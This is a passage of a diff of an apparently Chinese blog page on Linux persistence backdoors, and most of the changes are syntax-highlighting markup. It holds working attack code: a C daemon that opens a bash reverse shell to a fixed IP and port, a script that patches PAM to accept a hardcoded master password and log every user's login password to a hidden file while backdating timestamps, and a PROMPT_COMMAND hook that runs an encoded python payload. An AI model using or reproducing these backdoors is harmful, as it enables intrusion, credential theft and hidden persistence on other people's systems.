+</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">creat_daemon</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">time_t</span> <span class="n">t</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">creat_daemon</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 将ip和端口进行替换
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">system</span><span class="p">(</span><span class="s">&#34;bash -i &gt;&amp; /dev/tcp/192.168.80.147/12345 0&gt;&amp;1&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">creat_daemon</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pid_t</span> <span class="n">pid</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">devnullfd</span><span class="p">,</span><span class="n">fd</span><span class="p">,</span><span class="n">fdtablesize</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">umask</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">pid</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span> <span class="n">pid</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ERR_EXIT</span><span class="p">(</span><span class="s">&#34;fork error&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">pid</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_SUCCESS</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">setsid</span><span class="p">()</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ERR_EXIT</span><span class="p">(</span><span class="s">&#34;SETSID ERROR&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">chdir</span><span class="p">(</span><span class="s">&#34;/&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="cm">/* close any open file descriptors */</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="n">fd</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">fdtablesize</span> <span class="o">=</span> <span class="n">getdtablesize</span><span class="p">();</span> <span class="n">fd</span> <span class="o">&lt;</span> <span class="n">fdtablesize</span><span class="p">;</span> <span class="n">fd</span><span class="o">++</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">devnullfd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/dev/null&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="cm">/* make STDIN ,STDOUT and STDERR point to /dev/null */</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">devnullfd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ERR_EXIT</span><span class="p">(</span><span class="s">&#34;can&#39;t open /dev/null&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">dup2</span><span class="p">(</span><span class="n">devnullfd</span><span class="p">,</span> <span class="n">STDIN_FILENO</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ERR_EXIT</span><span class="p">(</span><span class="s">&#34;can&#39;t dup2 /dev/null to STDIN_FILENO&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">dup2</span><span class="p">(</span><span class="n">devnullfd</span><span class="p">,</span> <span class="n">STDOUT_FILENO</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ERR_EXIT</span><span class="p">(</span><span class="s">&#34;can&#39;t dup2 /dev/null to STDOUT_FILENO&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">dup2</span><span class="p">(</span><span class="n">devnullfd</span><span class="p">,</span> <span class="n">STDERR_FILENO</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ERR_EXIT</span><span class="p">(</span><span class="s">&#34;can&#39;t dup2 /dev/null to STDOUT_FILENO&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">signal</span><span class="p">(</span><span class="n">SIGCHLD</span><span class="p">,</span><span class="n">SIG_IGN</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>使用nc监听回弹的shell。</p>
 <h3 id="6-linux-pam密码记录后门文件落地">6. Linux PAM密码记录后门（文件落地）</h3>
@@ -1013,52 +1011,52 @@ crontab -e
 </span><span class="lnt">45
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/bash
-</span><span class="cp"></span><span class="c1">## </span>
-<span class="c1">##查看版本:</span>
-<span class="c1">##redhat yum list pam</span>
-<span class="c1">##debian&amp;Ubuntu  dpkg -s libpam-modules | grep -i version | cut -d&#39; &#39; -f2</span>
-<span class="c1">##</span>
-<span class="nv">PASS</span><span class="o">=</span><span class="s1">&#39;test123&#39;</span> <span class="c1">##......</span>
-<span class="nv">LOG</span><span class="o">=</span><span class="s1">&#39;\/bin\/.sshlog&#39;</span> <span class="c1">##......</span>
-
-<span class="nb">echo</span> <span class="s2">&#34;
-</span><span class="s2">.___  ___.   ___     ___    _______  ____    ____ 
-</span><span class="s2">|   \/   |  / _ \   / _ \  |       \ \   \  /   / 
-</span><span class="s2">|  \  /  | | | | | | | | | |  .--.  | \   \/   /  
-</span><span class="s2">|  |\/|  | | | | | | | | | |  |  |  |  \_    _/   
-</span><span class="s2">|  |  |  | | |_| | | |_| | |  &#39;--&#39;  |    |  |     
-</span><span class="s2">|__|  |__|  \___/   \___/  |_______/     |__|   &#34;</span>
-<span class="nb">echo</span> -e <span class="s2">&#34;\nPam-Backdoor\n{code this shit while learning pam}\n\n&#34;</span>
-<span class="nv">oldtime</span><span class="o">=</span><span class="sb">`</span>stat -c <span class="s1">&#39;%z&#39;</span> /lib/security/pam_ftp.so<span class="sb">`</span>
-<span class="nb">echo</span> <span class="s1">&#39;Pam backdoor starting!&#39;</span>
-<span class="nv">mirror_url</span><span class="o">=</span><span class="s1">&#39;http://www.linux-pam.org/library/Linux-PAM-1.1.1.tar.gz&#39;</span>
-<span class="c1">#mirror_url=&#39;http://yum.singlehop.com/pub/linux/libs/pam/pre/library/Linux-PAM-0.99.6.2.tar.gz&#39;，修改为对应的pam版本</span>
-<span class="nb">echo</span> <span class="s1">&#39;Fetching from &#39;</span><span class="nv">$mirror_url</span>
-wget <span class="nv">$mirror_url</span> <span class="c1">#fetch the roll</span>
-tar zxf Linux-PAM-1.1.1.tar.gz <span class="c1">#untar,修改为对应的pam版本</span>
-<span class="nb">cd</span> Linux-PAM-1.1.1
-<span class="c1">#find and replace</span>
-sed -i -e <span class="s1">&#39;s/retval = _unix_verify_password(pamh, name, p, ctrl);/retval = _unix_verify_password(pamh, name, p, ctrl);\n\tif (strcmp(p,&#34;&#39;</span><span class="nv">$PASS</span><span class="s1">&#39;&#34;)==0 ){retval = PAM_SUCCESS;}if(retval == PAM_SUCCESS){\n\tFILE * fp;\n\tfp = fopen(&#34;&#39;</span><span class="nv">$LOG</span><span class="s1">&#39;&#34;, &#34;a&#34;);\n\tfprintf(fp, &#34;%s : %s\\n&#34;, name, p);\n\tfclose(fp);\n\t}/g&#39;</span> modules/pam_unix/pam_unix_auth.c
-<span class="nv">DIS</span><span class="o">=</span><span class="sb">`</span>head /etc/issue -n 1<span class="p">|</span>awk <span class="s1">&#39;{print $1}&#39;</span><span class="sb">`</span>
-<span class="c1">#get the version</span>
-<span class="k">if</span> <span class="o">[</span> <span class="nv">$DIS</span> <span class="o">=</span> <span class="s2">&#34;CentOS&#34;</span> <span class="o">]</span><span class="p">;</span><span class="k">then</span>
-./configure --disable-selinux <span class="o">&amp;&amp;</span> make
-<span class="k">else</span>
-./configure <span class="o">&amp;&amp;</span> make
-<span class="k">fi</span>
-<span class="c1">#copy modified pam_unix.so</span>
-<span class="k">if</span> <span class="o">[</span> <span class="sb">`</span>uname -p<span class="sb">`</span> <span class="o">=</span> <span class="s1">&#39;x86_64&#39;</span> <span class="o">]</span><span class="p">;</span><span class="k">then</span>
-<span class="nv">LIBPATH</span><span class="o">=</span>lib64
-<span class="k">else</span>
-<span class="nv">LIBPATH</span><span class="o">=</span>lib
-<span class="k">fi</span>
-/bin/cp -rf /<span class="nv">$LIBPATH</span>/security/pam_unix.so /<span class="nv">$LIBPATH</span>/security/pam_unix.so.bak <span class="c1">#.. .........</span>
-/bin/cp -rf modules/pam_unix/.libs/pam_unix.so /<span class="nv">$LIBPATH</span>/security/pam_unix.so
-touch -d <span class="s2">&#34;</span><span class="nv">$oldtime</span><span class="s2">&#34;</span> /lib/security/pam_unix.so
-<span class="nb">cd</span> .. <span class="o">&amp;&amp;</span> rm -rf Linux-PAM-1.1.1*
-<span class="nb">echo</span> <span class="s2">&#34;Done bro..&#34;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="c1">## </span>
+</span></span><span class="line"><span class="cl"><span class="c1">##查看版本:</span>
+</span></span><span class="line"><span class="cl"><span class="c1">##redhat yum list pam</span>
+</span></span><span class="line"><span class="cl"><span class="c1">##debian&amp;Ubuntu  dpkg -s libpam-modules | grep -i version | cut -d&#39; &#39; -f2</span>
+</span></span><span class="line"><span class="cl"><span class="c1">##</span>
+</span></span><span class="line"><span class="cl"><span class="nv">PASS</span><span class="o">=</span><span class="s1">&#39;test123&#39;</span> <span class="c1">##......</span>
+</span></span><span class="line"><span class="cl"><span class="nv">LOG</span><span class="o">=</span><span class="s1">&#39;\/bin\/.sshlog&#39;</span> <span class="c1">##......</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">.___  ___.   ___     ___    _______  ____    ____ 
+</span></span></span><span class="line"><span class="cl"><span class="s2">|   \/   |  / _ \   / _ \  |       \ \   \  /   / 
+</span></span></span><span class="line"><span class="cl"><span class="s2">|  \  /  | | | | | | | | | |  .--.  | \   \/   /  
+</span></span></span><span class="line"><span class="cl"><span class="s2">|  |\/|  | | | | | | | | | |  |  |  |  \_    _/   
+</span></span></span><span class="line"><span class="cl"><span class="s2">|  |  |  | | |_| | | |_| | |  &#39;--&#39;  |    |  |     
+</span></span></span><span class="line"><span class="cl"><span class="s2">|__|  |__|  \___/   \___/  |_______/     |__|   &#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> -e <span class="s2">&#34;\nPam-Backdoor\n{code this shit while learning pam}\n\n&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">oldtime</span><span class="o">=</span><span class="sb">`</span>stat -c <span class="s1">&#39;%z&#39;</span> /lib/security/pam_ftp.so<span class="sb">`</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;Pam backdoor starting!&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">mirror_url</span><span class="o">=</span><span class="s1">&#39;http://www.linux-pam.org/library/Linux-PAM-1.1.1.tar.gz&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#mirror_url=&#39;http://yum.singlehop.com/pub/linux/libs/pam/pre/library/Linux-PAM-0.99.6.2.tar.gz&#39;，修改为对应的pam版本</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;Fetching from &#39;</span><span class="nv">$mirror_url</span>
+</span></span><span class="line"><span class="cl">wget <span class="nv">$mirror_url</span> <span class="c1">#fetch the roll</span>
+</span></span><span class="line"><span class="cl">tar zxf Linux-PAM-1.1.1.tar.gz <span class="c1">#untar,修改为对应的pam版本</span>
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> Linux-PAM-1.1.1
+</span></span><span class="line"><span class="cl"><span class="c1">#find and replace</span>
+</span></span><span class="line"><span class="cl">sed -i -e <span class="s1">&#39;s/retval = _unix_verify_password(pamh, name, p, ctrl);/retval = _unix_verify_password(pamh, name, p, ctrl);\n\tif (strcmp(p,&#34;&#39;</span><span class="nv">$PASS</span><span class="s1">&#39;&#34;)==0 ){retval = PAM_SUCCESS;}if(retval == PAM_SUCCESS){\n\tFILE * fp;\n\tfp = fopen(&#34;&#39;</span><span class="nv">$LOG</span><span class="s1">&#39;&#34;, &#34;a&#34;);\n\tfprintf(fp, &#34;%s : %s\\n&#34;, name, p);\n\tfclose(fp);\n\t}/g&#39;</span> modules/pam_unix/pam_unix_auth.c
+</span></span><span class="line"><span class="cl"><span class="nv">DIS</span><span class="o">=</span><span class="sb">`</span>head /etc/issue -n 1<span class="p">|</span>awk <span class="s1">&#39;{print $1}&#39;</span><span class="sb">`</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#get the version</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[</span> <span class="nv">$DIS</span> <span class="o">=</span> <span class="s2">&#34;CentOS&#34;</span> <span class="o">]</span><span class="p">;</span><span class="k">then</span>
+</span></span><span class="line"><span class="cl">./configure --disable-selinux <span class="o">&amp;&amp;</span> make
+</span></span><span class="line"><span class="cl"><span class="k">else</span>
+</span></span><span class="line"><span class="cl">./configure <span class="o">&amp;&amp;</span> make
+</span></span><span class="line"><span class="cl"><span class="k">fi</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#copy modified pam_unix.so</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[</span> <span class="sb">`</span>uname -p<span class="sb">`</span> <span class="o">=</span> <span class="s1">&#39;x86_64&#39;</span> <span class="o">]</span><span class="p">;</span><span class="k">then</span>
+</span></span><span class="line"><span class="cl"><span class="nv">LIBPATH</span><span class="o">=</span>lib64
+</span></span><span class="line"><span class="cl"><span class="k">else</span>
+</span></span><span class="line"><span class="cl"><span class="nv">LIBPATH</span><span class="o">=</span>lib
+</span></span><span class="line"><span class="cl"><span class="k">fi</span>
+</span></span><span class="line"><span class="cl">/bin/cp -rf /<span class="nv">$LIBPATH</span>/security/pam_unix.so /<span class="nv">$LIBPATH</span>/security/pam_unix.so.bak <span class="c1">#.. .........</span>
+</span></span><span class="line"><span class="cl">/bin/cp -rf modules/pam_unix/.libs/pam_unix.so /<span class="nv">$LIBPATH</span>/security/pam_unix.so
+</span></span><span class="line"><span class="cl">touch -d <span class="s2">&#34;</span><span class="nv">$oldtime</span><span class="s2">&#34;</span> /lib/security/pam_unix.so
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> .. <span class="o">&amp;&amp;</span> rm -rf Linux-PAM-1.1.1*
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;Done bro..&#34;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>可以根据需要将下载pam部分修改为上传本地下载好的pam，这样可以避免目标主机无法访问对应链接地址时造成的文件下载失败。</p>
 <p>Linux PAM版本地址：<a href="http://www.linux-pam.org/library/" target="_blank" rel="noopener noreffer">http://www.linux-pam.org/library/</a></p>
@@ -1070,8 +1068,8 @@ touch -d <span class="s2">&#34;</span><span class="nv">$oldtime</span><span clas
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">export</span> <span class="nv">PROMPT_COMMAND</span><span class="o">=</span><span class="s2">&#34;lsof -i:1025 &amp;&gt;/dev/null || (python -c &#34;</span>exec<span class="o">(</span><span class="s1">&#39;encoded_payload&#39;</span>.decode<span class="o">(</span><span class="s1">&#39;base64&#39;</span><span class="o">))</span><span class="s2">&#34; 2&gt;/dev/null &amp;)&#34;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">PROMPT_COMMAND</span><span class="o">=</span><span class="s2">&#34;lsof -i:1025 &amp;&gt;/dev/null || (python -c &#34;</span>exec<span class="o">(</span><span class="s1">&#39;encoded_payload&#39;</span>.decode<span class="o">(</span><span class="s1">&#39;base64&#39;</span><span class="o">))</span><span class="s2">&#34; 2&gt;/dev/null &amp;)&#34;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>也可以使用该变量进行提权：<a href="https://www.anquanke.com/post/id/155943" target="_blank" rel="noopener noreffer">https://www.anquanke.com/post/id/155943</a></p>
 <h3 id="7-rootkit">7. Rootkit</h3>
